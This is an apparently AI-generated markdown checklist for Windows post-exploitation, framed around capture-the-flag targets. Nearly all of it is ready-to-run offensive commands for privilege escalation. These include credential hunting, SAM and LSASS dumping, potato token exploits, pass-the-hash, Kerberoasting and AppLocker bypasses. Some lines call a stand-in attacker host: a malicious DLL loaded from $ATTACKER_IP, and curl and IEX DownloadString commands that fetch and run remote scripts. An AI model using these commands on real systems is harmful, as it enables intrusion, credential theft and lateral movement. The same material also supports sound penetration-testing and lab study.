# Windows Shell Enumeration Checklist

**Author:** Generated by AI
**Date:** 2026-03-07
**Path:**

---

## Foothold

- [ ] Who are we and what do we have?
  - [ ] `whoami /all` # User, groups, AND privileges in one shot
  - [ ] `[Security.Principal.WindowsIdentity]::GetCurrent()` # Token info
  - [ ] Do we have juicy privileges?
    - [ ] SeImpersonatePrivilege → Potato family (GodPotato, RoguePotato)
    - [ ] SeAssignPrimaryToken → Potato family
    - [ ] SeBackupPrivilege → Read any file (registry SAM/SYSTEM dump)
    - [ ] SeRestorePrivilege → Write any file
    - [ ] SeDebugPrivilege → Inject into SYSTEM processes
    - [ ] SeTakeOwnershipPrivilege → Take ownership of any object
    - [ ] SeLoadDriverPrivilege → Load malicious kernel driver

- [ ] Current user's group memberships
  - [ ] `Get-LocalGroupMember -Group Administrators`
  - [ ] `net localgroup`
  - [ ] Special groups to look for:
    - Backup Operators → SeBackupPrivilege to dump SAM
    - Remote Management Users → WinRM access
    - DnsAdmins → DLL injection into DNS service (runs as SYSTEM)
    - Event Log Readers → Read security logs for creds
    - Server Operators → Can start/stop services, write to some paths

- [ ] Password hunting
  - [ ] `(Get-PSReadlineOption).HistorySavePath | Get-Content` # PowerShell history
  - [ ] `Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
  - [ ] `cmdkey /list` # Saved credentials
  - [ ] `Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.ini,*.config,*.xml,*.bat,*.ps1 -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive:$false`
  - [ ] Registry credential hunting:
    - [ ] `reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` # AutoLogon creds
    - [ ] `reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s` # PuTTY saved sessions
    - [ ] `reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s` # SNMP community strings
  - [ ] Unattended install files (plaintext/base64 creds):
    - [ ] `Get-Item C:\Windows\Panther\Unattend.xml`
    - [ ] `Get-Item C:\Windows\System32\sysprep\sysprep.xml`
    - [ ] `Get-Item C:\Windows\System32\sysprep.inf`
  - [ ] IIS config: `Get-Content C:\inetpub\wwwroot\web.config`
  - [ ] XAMPP/Apache: `Get-Content C:\xampp\apache\conf\extra\httpd-ssl.conf`

- [ ] Logged on users / sessions
  - [ ] `query user`
  - [ ] `Get-WmiObject Win32_LoggedOnUser`
  - [ ] `Get-EventLog -LogName Security -InstanceId 4624 -Newest 20` # Recent logons

- [ ] Network reconnaissance
  - [ ] `Get-NetTCPConnection -State Listen` # Open ports (replaces ss -tunlp)
  - [ ] `Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}`
  - [ ] `ipconfig /all` # Interfaces, DNS, domain
  - [ ] `route print`
  - [ ] `arp -a` # Other hosts on network
  - [ ] `Get-Content C:\Windows\System32\drivers\etc\hosts` # Any vhosts missed?
  - [ ] Any ports only bound to localhost? → Port forward via:
    - [ ] `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1`

- [ ] Web application foothold
  - [ ] Download web root: `Compress-Archive -Path C:\inetpub\wwwroot -DestinationPath C:\Temp\www.zip`
  - [ ] Git repo? `Get-ChildItem -Path C:\inetpub -Filter ".git" -Recurse -Hidden`
    - [ ] `git -C C:\inetpub\wwwroot log --oneline`
    - [ ] `git -C C:\inetpub\wwwroot diff HEAD~1`
  - [ ] Database connections in config files?
    - [ ] `Get-ChildItem C:\inetpub -Recurse | Select-String "connectionString" -CaseSensitive:$false`
    - [ ] `Invoke-Sqlcmd -ServerInstance localhost -Query "SELECT name FROM sys.databases"` # if sqlclient available
    - [ ] Scrape users/hashes from DB → crack or reuse against other services

- [ ] SSH / RDP / WinRM pivoting
  - [ ] `Get-Service sshd`
  - [ ] `Test-WSMan localhost` # WinRM available?
  - [ ] Enable front-door access if you have local admin: [Enable RDP / WinRM](../infiltration/windows/enable-rdp-winrm.md)
  - [ ] Any private keys? `Get-ChildItem -Path C:\Users -Recurse -Filter "id_rsa" -ErrorAction SilentlyContinue`
  - [ ] `Get-ChildItem -Path C:\Users -Recurse -Filter "*.pem","*.pfx","*.p12" -ErrorAction SilentlyContinue`
  - [ ] Spray discovered passwords:
    - [ ] `Get-LocalUser | Select Name` # Get accounts to spray
    - [ ] Use netexec (nxc) from attacker box: `nxc smb $TARGET -u users.txt -p 'Password123'`

## Privilege Escalation

### Service Abuse

- [ ] Unquoted service paths
  - [ ] `Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name, PathName, StartMode, State`
  - [ ] If `C:\Program Files\My App\service.exe` → can we write `C:\Program.exe`?
- [ ] Weak service binary permissions
  - [ ] `Get-WmiObject Win32_Service | ForEach-Object { $path = $_.PathName -replace '"',''; if (Test-Path $path) { $acl = Get-Acl $path; $acl.Access | Where-Object {$_.FileSystemRights -match "Write|FullControl" -and $_.IdentityReference -notmatch "SYSTEM|Administrators|TrustedInstaller"} | ForEach-Object { [PSCustomObject]@{Service=$_.ServiceName; Path=$path; Identity=$_.IdentityReference; Rights=$_.FileSystemRights} } } }`
- [ ] Weak service registry permissions
  - [ ] `Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\* | Where-Object {$_.AccessToString -match "Everyone|Users|Authenticated"}`
- [ ] Can we start/stop vulnerable services?
  - [ ] `Get-Service | Where-Object {$_.Status -eq "Stopped"}` # Stopped services we might restart after replacing binary

### Scheduled Tasks

- [ ] `Get-ScheduledTask | Where-Object {$_.Principal.UserId -match "SYSTEM|Administrator"} | Select TaskName, TaskPath`
- [ ] Task actions running scripts/binaries we can write to?
  - [ ] `Get-ScheduledTask | ForEach-Object { $_ | Get-ScheduledTaskInfo; $_.Actions }`
- [ ] Wildcard injection? (same as Linux — `tar *`, custom backup scripts)
- [ ] Missing binary path? → Drop our own binary there

### Registry AutoRuns

- [ ] `Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- [ ] `Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- [ ] `Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
- [ ] Writable path? → Replace binary, wait for reboot/logon

### AlwaysInstallElevated

- [ ] `Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated`
- [ ] `Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated`
- [ ] Both = 1? → `msiexec /quiet /qn /i malicious.msi` runs as SYSTEM

### Token Impersonation (Potatoes)

- [ ] Confirm SeImpersonatePrivilege: `whoami /priv`
- [ ] Drop and run appropriate potato:
  - [ ] GodPotato (widest compat): `.\GodPotato.exe -cmd "cmd /c whoami"`
  - [ ] RoguePotato (Server 2019+): `.\RoguePotato.exe -r $ATTACKER_IP -e "cmd.exe"`
  - [ ] PrintSpoofer (alt method): `.\PrintSpoofer.exe -i -c cmd`

### DLL Hijacking

- [ ] Check for missing DLLs in process PATH:
  - [ ] Use ProcMon (if GUI available) or check writable dirs in `$env:PATH`
  - [ ] `$env:PATH -split ';' | ForEach-Object { $acl = Get-Acl $_; $acl.Access | Where-Object {$_.FileSystemRights -match "Write|FullControl" -and $_.IdentityReference -notmatch "SYSTEM|Administrators"} }`
- [ ] DnsAdmins group? → `dnscmd /config /serverlevelplugindll \\$ATTACKER_IP\share\evil.dll`

### Credential/Hash Dumping (if already elevated)

- [ ] `reg save HKLM\SAM C:\Temp\sam.hive`
- [ ] `reg save HKLM\SYSTEM C:\Temp\system.hive`
- [ ] `reg save HKLM\SECURITY C:\Temp\security.hive` # Domain cached creds
- [ ] Exfil and crack with `secretsdump.py` or `pypykatz`
- [ ] LSASS dump (if SeDebugPrivilege):
  - [ ] `procdump.exe -ma lsass.exe lsass.dmp` or `rundll32 comsvcs.dll, MiniDump $p.Id C:\Temp\lsass.dmp full`

### Writable Sensitive Files

- [ ] `Get-Acl C:\Windows\System32\*.dll | ...` # Usually locked, but worth checking after patches
- [ ] Writable `C:\Windows\System32\drivers\etc\hosts`? → DNS poisoning for internal pivoting
- [ ] Writable service binary path? → See Service Abuse above

## Lateral Movement / Post-Root

- [ ] Do we actually need SYSTEM for the flag? `Get-Content C:\Users\Administrator\Desktop\root.txt`
- [ ] Re-run `whoami /all` as new user — new privileges?
- [ ] Pass-the-Hash with dumped NTLM:
  - [ ] `nxc smb $TARGET -u Administrator -H <NTHash>`
- [ ] Kerberoasting (if domain-joined):
  - [ ] `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
  - [ ] Or: `.\Rubeus.exe kerberoast /outfile:hashes.txt`
- [ ] ASREPRoasting:
  - [ ] `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth`
- [ ] Dump domain cached credentials from registry (SECURITY hive)
- [ ] Any stored RDP credentials? `Get-ChildItem C:\Users\*\AppData\Local\Microsoft\Credentials -Hidden`

---

## Container / Sandbox Breakout

- [ ] Are we in a container?
  - [ ] `Get-Item C:\.dockerenv` or check hostname pattern
  - [ ] `(Get-WmiObject Win32_ComputerSystem).Model` — "Virtual Machine"?
- [ ] Docker Desktop socket accessible? `Test-Path \\.\pipe\docker_engine`
- [ ] Hyper-V / WSL present? `Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V`
- [ ] AppLocker / WDAC restrictions?
  - [ ] `Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone`
  - [ ] Bypass via: `installutil`, `regsvcs`, `msbuild`, `rundll32`, trusted folders

---

## Jail Breakout (Constrained PowerShell / JEA)

- [ ] Language mode? `$ExecutionContext.SessionState.LanguageMode` # FullLanguage vs ConstrainedLanguage
- [ ] JEA endpoint? `Get-PSSessionConfiguration`
  - [ ] What commands are exposed? `Get-Command` inside session
  - [ ] Visible commands that call scripts/binaries we can control?
  - [ ] Relative paths in JEA module scripts? → PATH poisoning
- [ ] Constrained Language bypass attempts:
  - [ ] COM objects still available? `$wsh = New-Object -ComObject WScript.Shell; $wsh.Run("cmd.exe")`
  - [ ] `[System.Reflection.Assembly]::LoadWithPartialName` available?
  - [ ] MSHTA / rundll32 / msbuild as escape hatches
- [ ] Source code visible for custom cmdlets?
  - [ ] `(Get-Command Invoke-CustomTool).ScriptBlock`
  - [ ] Race conditions (TOCTOU) in file operations?
  - [ ] Does it call other binaries with relative paths?
- [ ] `ldd` equivalent — check DLL load order for any custom tools
- [ ] Binary available? Drop to attacker box, run locally, decompile with dnSpy / ILSpy (.NET), Ghidra (native)

## Quick Wins — Run These First

```powershell
# One-liner triage dump
whoami /all; systeminfo | Select-String "OS|Domain|Hotfix"; Get-LocalGroupMember Administrators; Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort; $env:PATH; (Get-PSReadlineOption).HistorySavePath | Get-Content; cmdkey /list; reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

- [ ] Run **WinPEAS**: `curl http://$ATTACKER_IP/winpeas.exe -o C:\Temp\wp.exe; .\wp.exe`
- [ ] Run **PrivescCheck**: `IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/PrivescCheck.ps1'); Invoke-PrivescCheck`
- [ ] Run **PowerUp**: `IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/PowerUp.ps1'); Invoke-AllChecks`
